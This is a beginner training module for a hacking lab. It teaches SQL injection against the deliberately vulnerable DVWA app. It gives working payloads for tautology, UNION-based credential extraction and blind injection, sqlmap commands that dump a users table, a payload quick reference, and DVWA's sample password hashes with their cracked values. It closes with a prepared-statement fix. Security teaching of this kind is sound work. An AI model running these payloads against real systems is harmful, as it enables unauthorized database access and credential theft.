# Beginner Module 1: SQL Injection

**Difficulty:** ⭐ Beginner  
**Time Required:** 2-3 hours  
**Prerequisites:** Lab setup complete, DVWA accessible

---

## Learning Objectives

- Understand what SQL injection is and why it's dangerous
- Identify SQL injection vulnerabilities manually
- Extract data using UNION-based attacks
- Use sqlmap for automated exploitation

---

## What is SQL Injection?

SQL Injection (SQLi) exploits applications that construct SQL queries using unsanitized user input, allowing attackers to read, modify, or delete database data.

---

## Lab Setup

### Access DVWA

```bash
# Start port forwarding
kubectl port-forward -n vulnerable-apps svc/dvwa-service 8080:80 &

# Open http://localhost:8080
# Login: admin / password
# Click "Create / Reset Database" (first time only)
# Go to "DVWA Security" → Set to "Low"
```

### Connect to Kali

```bash
kubectl exec -it -n attacker deploy/kali-attacker -- /bin/bash

# Inside Kali, target URLs:
# DVWA: http://dvwa-service.vulnerable-apps.svc.cluster.local
# Juice Shop: http://juice-shop-service.vulnerable-apps.svc.cluster.local:3000
```

---

## Exercise 1.1: Testing for SQL Injection

Navigate to: **DVWA → SQL Injection**

### Normal Input

Enter `1` in the User ID field → Shows "admin"

### Test for Vulnerability

Enter `1'` → You should see a SQL error!

This confirms the application is vulnerable.

---

## Exercise 1.2: Basic SQL Injection

### Retrieve All Users

Enter:
```
1' OR '1'='1
```

**Result:** All users are displayed!

### Why It Works

The query becomes:
```sql
SELECT * FROM users WHERE user_id = '1' OR '1'='1'
```

Since `'1'='1'` is always true, all rows match.

---

## Exercise 1.3: UNION-Based Extraction

### Step 1: Find Column Count

```
1' ORDER BY 1-- -    → Works
1' ORDER BY 2-- -    → Works
1' ORDER BY 3-- -    → Error!
```

**Result:** 2 columns exist.

### Step 2: Get Database Info

```
1' UNION SELECT null, version()-- -
1' UNION SELECT null, database()-- -
1' UNION SELECT null, user()-- -
```

### Step 3: List Tables

```
1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()-- -
```

### Step 4: List Columns

```
1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'-- -
```

### Step 5: Extract Credentials

```
1' UNION SELECT user, password FROM users-- -
```

**🎉 Success!** You've extracted all usernames and password hashes!

<details>
<summary>✅ Expected Output</summary>

| User | Password (MD5) |
|------|----------------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb | e99a18c428cb38d5f260853678922e03 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 |

Cracked passwords:
- admin: password
- gordonb: abc123
- 1337: charley
- pablo: letmein
- smithy: password

</details>

---

## Exercise 1.4: Automated Exploitation with sqlmap

### From Kali Pod

```bash
# First, get your PHPSESSID cookie from the browser
# Then run sqlmap:

sqlmap -u "http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=YOUR_SESSION_ID" \
  --batch \
  --dbs
```

### Dump the Users Table

```bash
sqlmap -u "http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=YOUR_SESSION_ID" \
  --batch \
  -D dvwa \
  -T users \
  --dump
```

---

## Exercise 1.5: Blind SQL Injection

### Boolean-Based

```
1' AND 1=1-- -    → Returns data (true)
1' AND 1=2-- -    → No data (false)
```

### Time-Based

```
1' AND SLEEP(5)-- -
```

If the page takes 5 seconds to load, it's vulnerable!

---

## Knowledge Check

1. What character is commonly used to test for SQLi?
2. What does `-- -` do?
3. Why is UNION useful?
4. What table contains table names in MySQL?

<details>
<summary>✅ Answers</summary>

1. Single quote (`'`)
2. Comments out the rest of the query
3. Combines your query results with the original
4. `information_schema.tables`

</details>

---

## Prevention

```php
// VULNERABLE
$query = "SELECT * FROM users WHERE id = '$id'";

// SECURE - Prepared Statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```

---

## Summary

- ✅ Manual SQL injection testing
- ✅ UNION-based data extraction
- ✅ sqlmap automation
- ✅ Prevention techniques

**Next:** Beginner Module 2: XSS Attacks

---

## Quick Reference

| Purpose | Payload |
|---------|---------|
| Test | `'` |
| Always true | `' OR '1'='1` |
| Comment | `-- -` or `#` |
| Find columns | `ORDER BY 1,2,3...` |
| UNION | `UNION SELECT null,null` |
| Version | `version()` |
| Database | `database()` |
| Tables | `SELECT table_name FROM information_schema.tables` |
